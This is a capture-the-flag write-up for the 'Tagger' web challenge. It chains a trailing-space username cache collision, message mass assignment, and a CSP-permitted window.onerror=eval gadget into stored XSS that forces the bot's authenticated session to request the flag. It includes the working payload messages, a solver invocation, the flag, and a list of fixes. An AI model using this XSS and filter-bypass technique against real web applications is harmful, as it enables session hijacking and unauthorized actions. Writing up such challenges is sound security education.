# TFC CTF 2026 — Tagger

| Property | Value |
| --- | --- |
| Category | Web |
| Points | 249 |
| Author | Sagi |

## Overview

Tagger is a small chat application built with Express, Sequelize, SQLite and
EJS. Two hidden users are created by the application:

- `Hacker`
- `FlagHolder`

The bot runs every 60 seconds. First, `Hacker` opens the conversation with
`FlagHolder`. Then `FlagHolder` checks the sidebar preview of the conversation
with `Hacker`. If the preview is exactly `Give me the flag!`, it opens the
conversation and sends `process.env.FLAG`.

The goal is therefore to make the real `Hacker` bot send one message as an
authenticated user, while also making its browser render attacker-controlled
HTML.

## 1. Cache collision using trailing spaces

Registration accepts spaces because the username validation is:

```js
/^[a-zA-Z0-9_ ]{3,32}$/
```

The username is not trimmed before it is stored. Therefore these are different
SQLite users:

```text
Hacker
Hacker␠
```

The same applies to `FlagHolder`.

However, the chat history cache trims usernames when constructing its key:

```js
function messageHistoryKey(firstUsername, secondUsername) {
  return `${firstUsername.trim()}:${secondUsername.trim()}`;
}
```

Registering `Hacker ` and `FlagHolder ` gives us a normal visible friendship,
while their chat history is cached under the same key used by the hidden bot
accounts:

```text
Hacker :FlagHolder  -> Hacker:FlagHolder
Hacker:FlagHolder    -> Hacker:FlagHolder
```

This lets us populate the cache with messages from our visible accounts. When
the real `Hacker` account opens its chat, it can receive those cached messages.

## 2. Message mass assignment

The message route protects only a few fields:

```js
const protectedFields = new Set([
  "id",
  "fromUserId",
  "toUserId",
  "sentAt",
]);
```

Other fields are copied from the request body, including:

```text
type
tagName
attributes
content
```

The rendered message is inserted into the page using EJS's unescaped output:

```ejs
<%- messageMarkup(message) %>
```

## 3. Why the obvious XSS payload fails

The first idea is an image such as:

```html
<img onerror="fetch('/chat/2/message', ...)" ...>
```

The event attribute name `onerror` is allowed, but attribute values are
restricted by:

```js
/^[a-zA-Z0-9,. =]*$/
```

Consequently, parentheses, quotes, slashes, braces and other characters needed
for a direct `fetch(...)` call are removed from the rendered attributes. The
original direct-fetch writeup does not match the deployed filter.

The application does, however, use this CSP:

```http
script-src 'self' 'unsafe-eval'
script-src-elem 'self'
script-src-attr 'unsafe-inline'
```

This gives us inline event handlers and, importantly, `eval`.

## 4. The working three-message eval gadget

We send three messages in this order.

### Message 1: unrestricted JavaScript in text content

The text content is escaped in HTML, but the browser reconstructs it through
`textContent`. We store:

```js
=fetch('/chat/2/message', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'message=Give+me+the+flag!'
})
```

The leading `=` is intentional.

### Message 2: install eval as the global error handler

This is a malformed image with the only JavaScript expression that needs to fit
inside the attribute filter:

```html
<img onerror="window.onerror=eval" ...>
```

### Message 3: throw the text source

The third image throws the text of the first message. Its handler is:

```js
throw event.target.parentNode.parentNode
  .previousElementSibling.previousElementSibling
  .firstElementChild.firstElementChild.textContent
```

The DOM traversal is:

```text
image -> message bubble -> article
      -> previous article (setup image)
      -> previous article (JavaScript text)
      -> bubble -> p
```

The final `firstElementChild` calls are important. Reading the entire article
would also include its timestamp and cause a syntax error.

When the string is thrown, Chromium calls `window.onerror`. Since that handler
is now `eval`, the browser evaluates code equivalent to:

```js
Uncaught = fetch('/chat/2/message', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'message=Give+me+the+flag!'
})
```

The leading `Uncaught ` comes from Chromium's error message format. The
assignment is valid JavaScript, and `unsafe-eval` permits its execution.

The request is sent from the real `Hacker` page, so it uses the bot's session
cookie and successfully creates a database message from real user ID `1` to
real `FlagHolder` ID `2`.

## 5. Complete exploit flow

1. Register `Hacker ` and `FlagHolder ` using separate sessions.
2. Create and accept a friendship between the two visible users.
3. Send the three crafted messages to the visible `FlagHolder ` account.
4. Open the visible chat to populate `messageHistoryCache["Hacker:FlagHolder"]`.
5. Wait for the bot's `Hacker` cycle.
6. The cached HTML executes in the real `Hacker` browser and sends:

   ```text
   Give me the flag!
   ```

7. The `FlagHolder` bot sees the exact sidebar preview and replies with the
   challenge flag.

The solver polls both chat directions because the application invalidates the
two directional cache keys independently after a message is sent.

## Running the solver

For local testing, Chromium must be selected explicitly:

```bash
cd challenge/src
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium npm start
```

In another terminal:

```bash
python3 solver/solve.py \
  https://tagger-INSTANCE.challs.ctf.thefewchosen.com \
  --timeout 300
```

The bot interval is 60 seconds, so the solver intentionally waits for several
cycles.

## Flag

```text
TFCCTF{Tagg3r_m15C0muN1cA710n}
```

## Root causes

- Usernames are accepted and stored with trailing spaces.
- Cache keys normalize usernames inconsistently with database identity.
- Message fields are mass-assigned from user input.
- Event-handler attributes are rendered as raw HTML.
- `script-src-attr 'unsafe-inline'` enables inline event handlers.
- `unsafe-eval` makes the error-handler gadget possible.

The fixes are to normalize usernames before storage, use an identity-safe cache
key, allowlist message fields and attributes, render messages through a safe
DOM/component layer, and remove `unsafe-eval` and inline script permissions.
